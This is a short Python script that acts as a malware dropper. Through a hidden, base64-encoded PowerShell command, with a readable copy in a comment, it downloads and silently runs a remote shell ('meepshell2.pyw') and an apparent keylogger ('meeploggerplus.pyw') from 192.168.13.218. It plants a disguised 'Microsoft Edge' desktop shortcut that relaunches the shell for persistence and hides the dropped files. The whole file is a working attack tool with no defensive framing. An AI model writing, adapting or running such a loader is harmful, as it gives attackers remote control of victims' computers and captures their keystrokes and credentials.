from subprocess import check_output


def main():
    # wget -o $env:TEMP\meepshell2.pyw http://192.168.13.218:82/meepshell2.pyw; pythonw.exe $env:TEMP\meepshell2.pyw; wget -o $env:TEMP\meeploggerplus.pyw http://192.168.13.218:82/meeploggerplus.pyw; pythonw.exe $env:TEMP\meepsloggerplus.pyw; $WShell = New-Object -comObject WScript.Shell; $Shortcut = $WShell.CreateShortcut("$env:USERPROFILE\Desktop\Microsoft Edge.lnk"); $Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"; $Shortcut.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,IDR_MAINFRAME"; $Shortcut.hotkey = "ctrl+a"; $Shortcut.Arguments = "-WindowStyle Hidden if (-not (Test-Path $env:TEMP\meepshell2.pyw)) {wget -o $env:TEMP\meepshell.pyw http://192.168.13.218:82/meepshell2.pyw}; try {Get-Process -Name pythonw -ErrorAction Stop} catch {pythonw.exe $env:TEMP\meepshell2.pyw}; attrib.exe +s +h $env:TEMP\meep*"; $Shortcut.WindowStyle = 7; $Shortcut.Save();
    check_output('powershell -WindowStyle Hidden -encoded dwBnAGUAdAAgAC0AbwAgACQAZQBuAHYAOgBUAEUATQBQAFwAbQBlAGUAcABzAGgAZQBsAGwAMgAuAHAAeQB3ACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAzAC4AMgAxADgAOgA4ADIALwBtAGUAZQBwAHMAaABlAGwAbAAyAC4AcAB5AHcAOwAgAHAAeQB0AGgAbwBuAHcALgBlAHgAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAbQBlAGUAcABzAGgAZQBsAGwAMgAuAHAAeQB3ADsAIAB3AGcAZQB0ACAALQBvACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGUAZQBwAGwAbwBnAGcAZQByAHAAbAB1AHMALgBwAHkAdwAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMwAuADIAMQA4ADoAOAAyAC8AbQBlAGUAcABsAG8AZwBnAGUAcgBwAGwAdQBzAC4AcAB5AHcAOwAgAHAAeQB0AGgAbwBuAHcALgBlAHgAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAbQBlAGUAcABsAG8AZwBnAGUAcgBwAGwAdQBzAC4AcAB5AHcAOwAgACQAVwBTAGgAZQBsAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AYwBvAG0ATwBiAGoAZQBjAHQAIABXAFMAYwByAGkAcAB0AC4AUwBoAGUAbABsADsAIAAkAFMAaABvAHIAdABjAHUAdAAgAD0AIAAkAFcAUwBoAGUAbABsAC4AQwByAGUAYQB0AGUAUwBoAG8AcgB0AGMAdQB0ACgAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEQAZQBzAGsAdABvAHAAXABNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUALgBsAG4AawAiACkAOwAgACQAUwBoAG8AcgB0AGMAdQB0AC4AVABhAHIAZwBlAHQAUABhAHQAaAAgAD0AIAAiACUAUwB5AHMAdABlAG0AUgBvAG8AdAAlAFwAcwB5AHMAdABlAG0AMwAyAFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAEkAYwBvAG4ATABvAGMAYQB0AGkAbwBuACAAPQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAgACgAeAA4ADYAKQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwARQBkAGcAZQBcAEEAcABwAGwAaQBjAGEAdABpAG8AbgBcAG0AcwBlAGQAZwBlAC4AZQB4AGUALABJAEQAUgBfAE0AQQBJAE4ARgBSAEEATQBFACIAOwAgACQAUwBoAG8AcgB0AGMAdQB0AC4AaABvAHQAawBlAHkAIAA9ACAAIgBjAHQAcgBsACsAdgAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAEEAcgBnAHUAbQBlAG4AdABzACAAPQAgACIALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAGkAZgAgACgALQBuAG8AdAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AZQBlAHAAcwBoAGUAbABsADIALgBwAHkAdwApACkAIAB7AHcAZwBlAHQAIAAtAG8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AZQBlAHAAcwBoAGUAbABsAC4AcAB5AHcAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADMALgAyADEAOAA6ADgAMgAvAG0AZQBlAHAAcwBoAGUAbABsADIALgBwAHkAdwB9ADsAIAB0AHIAeQAgAHsARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAcAB5AHQAaABvAG4AdwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAB9ACAAYwBhAHQAYwBoACAAewBwAHkAdABoAG8AbgB3AC4AZQB4AGUAIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AZQBlAHAAcwBoAGUAbABsADIALgBwAHkAdwB9ADsAIABhAHQAdAByAGkAYgAuAGUAeABlACAAKwBzACAAKwBoACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGUAZQBwACoAIgA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIAA9ACAANwA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBTAGEAdgBlACgAKQA7AA==')


if __name__ == '__main__':
    main()